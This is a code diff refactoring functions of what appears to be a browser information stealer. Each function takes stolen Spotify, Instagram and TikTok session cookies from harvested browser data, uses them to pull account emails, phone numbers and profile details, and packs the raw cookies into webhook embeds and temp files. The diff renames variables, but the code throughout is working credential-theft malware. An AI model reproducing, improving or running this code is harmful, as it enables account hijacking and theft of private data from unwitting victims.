@@ -6,22 +6,20 @@ const requests = require('./../../utils/requests/requests.js');
 const fileutil = require('./../../utils/fileutil/fileutil.js');
 const program = require('./../../utils/program/program.js');
 
-const randString = (length) => {
-    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
-};
-
 const spotify = async (webhookUrl) => {
-    const spotifyCookies = structures.BrowserStatistics.cookies.filter(cookie => cookie.host_key === '.spotify.com' && cookie.name === 'sp_dc');
+    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+        cookie.host_key === '.spotify.com' && 
+        cookie.name === 'sp_dc'
+    );
 
-    if (spotifyCookies.length === 0) return; 
+    if (cookies.length === 0) return; 
 
-    for (const spotifyCookie of spotifyCookies) {
+    for (const cookie of cookies) {
         try {
             const response = await axios.get('https://www.spotify.com/api/account-settings/v1/profile', {
                 headers: {
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
-                    'Cookie': `sp_dc=${spotifyCookie.value}`
+                    'Cookie': `sp_dc=${cookie.value}`
                 }
             });
             const profile = response.data.profile || {};
@@ -86,7 +84,7 @@ const spotify = async (webhookUrl) => {
                         { name: '\u200b', value: '\u200b', inline: false },
                         {
                             name: 'Spotify Cookie',
-                            value: '```' + ('sp_dc=' + spotifyCookie.value) + '```',
+                            value: '```' + ('sp_dc=' + cookie.value) + '```',
                             inline: false
                         }
                     ]
@@ -103,11 +101,11 @@ const spotify = async (webhookUrl) => {
                 `Email: ${full_profile.email}`,
                 `Country: ${full_profile.country}`,
                 `Spotify Profile: https://open.spotify.com/user/${full_profile.username}`,
-                `Spotify Cookie: ${('sp_dc=' + spotifyCookie.value)}`,
+                `Spotify Cookie: ${('sp_dc=' + cookie.value)}`,
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `spotifyInfo-${randString(10)}.txt`, spotifyInfo);
+            await fileutil.writeDataToFile(WishTempDir, `spotifyInfo-${program.randString(10)}.txt`, spotifyInfo);
             
         } catch (error) {
             console.error(error);
@@ -116,11 +114,14 @@ const spotify = async (webhookUrl) => {
 };
 
 const instagram = async (webhookUrl) => {
-    const instagramCookies = structures.BrowserStatistics.cookies.filter(cookie => cookie.host_key === '.instagram.com' && cookie.name === 'sessionid');
+    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+        cookie.host_key === '.instagram.com' && 
+        cookie.name === 'sessionid'
+    );
 
-    if (instagramCookies.length === 0) return; 
+    if (cookies.length === 0) return; 
 
-    for (const instagramCookie of instagramCookies) {
+    for (const cookie of cookies) {
         try {
             const userResponse = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', {
                 headers: {
@@ -132,7 +133,7 @@ const instagram = async (webhookUrl) => {
                     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'User-Agent': 'Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+',
                     'X-Mid': 'Ypg64wAAAAGXLOPZjFPNikpr8nJt',
-                    'Cookie': `sessionid=${instagramCookie.value};`
+                    'Cookie': `sessionid=${cookie.value};`
                 }
             });
             const user = userResponse.data.user || {};
@@ -150,7 +151,7 @@ const instagram = async (webhookUrl) => {
                 headers: {
                     'Host': 'i.instagram.com',
                     'User-Agent': 'Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+',
-                    'Cookie': `sessionid=${instagramCookie.value};`
+                    'Cookie': `sessionid=${cookie.value};`
                 }
             });
             const profile = profileResponse.data.user || {};
@@ -229,7 +230,7 @@ const instagram = async (webhookUrl) => {
                         { name: '\u200b', value: '\u200b', inline: false },
                         {
                             name: 'Instagram Cookie',
-                            value: '```' + ('sessionid=' + instagramCookie.value) + '```',
+                            value: '```' + ('sessionid=' + cookie.value) + '```',
                             inline: false
                         }
                     ]
@@ -248,11 +249,11 @@ const instagram = async (webhookUrl) => {
                 `Phone Number: ${full_profile.phone_number}`,
                 `Email: ${full_profile.email}`,
                 `Instagram Profile: https://www.instagram.com/${full_profile.username}`,
-                `Instagram Cookie: ${('sessionid=' + instagramCookie.value)}`,
+                `Instagram Cookie: ${('sessionid=' + cookie.value)}`,
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `instagramInfo-${randString(10)}.txt`, instagramInfo);
+            await fileutil.writeDataToFile(WishTempDir, `instagramInfo-${program.randString(10)}.txt`, instagramInfo);
 
         } catch (error) {
             console.error(error);
@@ -261,17 +262,20 @@ const instagram = async (webhookUrl) => {
 };
 
 const tiktok = async (webhookUrl) => {
-    const tiktokCookies = structures.BrowserStatistics.cookies.filter(cookie => cookie.host_key === '.tiktok.com' && cookie.name === 'sessionid');
+    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+        cookie.host_key === '.tiktok.com' && 
+        cookie.name === 'sessionid'
+    );
 
-    if (tiktokCookies.length === 0) return;
+    if (cookies.length === 0) return;
 
-    for (const tiktokCookie of tiktokCookies) {
+    for (const cookie of cookies) {
         try {
             const userResponse = await axios.get('https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE', {
                 headers: {
                     'accept': 'application/json, text/plain, */*',
                     'accept-encoding': 'gzip, compress, deflate, br',
-                    'Cookie': `sessionid=${tiktokCookie.value};`
+                    'Cookie': `sessionid=${cookie.value};`
                 }
             });
             const user = userResponse.data.data || {};
@@ -283,11 +287,10 @@ const tiktok = async (webhookUrl) => {
                 username = 'Not Found',
                 email = 'Not Found',
             } = user;
-            if (email === 'Not Found') return;
 
             const webcastResponse = await axios.get('https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true', {
                 headers: {
-                    'Cookie': `sessionid=${tiktokCookie.value};`
+                    'Cookie': `sessionid=${cookie.value};`
                 }
             });
             const webcast = webcastResponse.data.data || {};
@@ -312,7 +315,7 @@ const tiktok = async (webhookUrl) => {
                     { insigh_type: 'room_info' }
                 ])}`, {
                 headers: {
-                    'Cookie': `sessionid=${tiktokCookie.value};`
+                    'Cookie': `sessionid=${cookie.value};`
                 }
             });
             const insights = insightsResponse.data.follower_num || {};
@@ -390,7 +393,7 @@ const tiktok = async (webhookUrl) => {
                         { name: '\u200b', value: '\u200b', inline: false },
                         {
                             name: 'Tiktok Cookie',
-                            value: '```' + ('sessionid=' + tiktokCookie.value) + '```',
+                            value: '```' + ('sessionid=' + cookie.value) + '```',
                             inline: false
                         }
                     ]
@@ -408,11 +411,11 @@ const tiktok = async (webhookUrl) => {
                 `Followers: ${full_profile.insights_value}`,
                 `Email: ${full_profile.email}`,
                 `Tiktok Profile: https://tiktok.com/@${full_profile.username}`,
-                `Tiktok Cookie: ${('sessionid=' + tiktokCookie.value)}`,
+                `Tiktok Cookie: ${('sessionid=' + cookie.value)}`,
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `tiktokInfo-${randString(10)}.txt`, tiktokInfo);
+            await fileutil.writeDataToFile(WishTempDir, `tiktokInfo-${program.randString(10)}.txt`, tiktokInfo);
 
         } catch (error) {
             console.error(error);
